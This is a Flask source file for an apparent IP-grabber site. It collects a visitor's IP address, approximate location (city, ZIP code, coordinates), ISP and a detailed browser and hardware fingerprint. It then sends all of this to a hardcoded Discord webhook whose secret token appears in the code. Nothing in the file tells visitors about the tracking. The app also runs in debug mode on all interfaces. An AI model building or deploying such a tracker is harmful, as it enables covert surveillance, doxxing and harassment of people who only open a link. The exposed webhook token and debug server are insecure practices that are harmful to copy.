from flask import Flask, request, jsonify, render_template
import json
from datetime import datetime
import requests
import os

app = Flask(__name__)

# URL du webhook Discord
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1266194003376865330/k80YztyYPN9PpYFZSt3QrXSO84QJ_K5HSrofbzdUMcpLj1WMGfUVkaE8-FTxwMuqKSog'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log_ip', methods=['POST'])
def log_ip():
    data = request.json
    if 'ip' in data:
        ip = data['ip']
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        log_entry = (
            f"IP: {data.get('ip')}\n"
            f"Country: {data.get('country')}\n"
            f"Region: {data.get('region')}\n"
            f"City: {data.get('city')}\n"
            f"ZIP Code: {data.get('zip')}\n"
            f"Full Location: {data.get('full_location')}\n"
            f"Latitude: {data.get('latitude')}\n"
            f"Longitude: {data.get('longitude')}\n"
            f"Timezone: {data.get('timezone')}\n"
            f"Current Time: {timestamp}\n"
            f"ISP: {data.get('isp')}\n"
            f"Organization: {data.get('organization')}\n"
            f"Autonomous System: {data.get('autonomous_system')}\n"
            f"Browser Name: {data.get('browser_name')}\n"
            f"Platform Name: {data.get('platform_name')}\n"
            f"Browser Version: {data.get('browser_version')}\n"
            f"Mobile/Tablet: {data.get('mobile_tablet')}\n"
            f"Referrer: {data.get('referrer')}\n"
            f"System Languages: {data.get('system_languages')}\n"
            f"Screen Width: {data.get('screen_width')}\n"
            f"Screen Height: {data.get('screen_height')}\n"
            f"Window Width: {data.get('window_width')}\n"
            f"Window Height: {data.get('window_height')}\n"
            f"Display Pixel Depth: {data.get('pixel_depth')}\n"
            f"Screen Orientation: {data.get('screen_orientation')}\n"
            f"Screen Rotation: {data.get('screen_rotation')}\n"
            f"CPU Threads: {data.get('cpu_threads')}\n"
            f"Available Browser Memory: {data.get('available_memory')}\n"
            f"GPU Vendor: {data.get('gpu_vendor')}\n"
            f"GPU Info: {data.get('gpu_info')}\n\n"
        )

        # Envoyer les logs au webhook Discord
        payload = {
            'content': f"New IP log:\n```\n{log_entry}\n```"
        }
        requests.post(DISCORD_WEBHOOK_URL, json=payload)

       
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))  # Default to 5000 if PORT is not set
    app.run(host='0.0.0.0', port=port, debug=True)
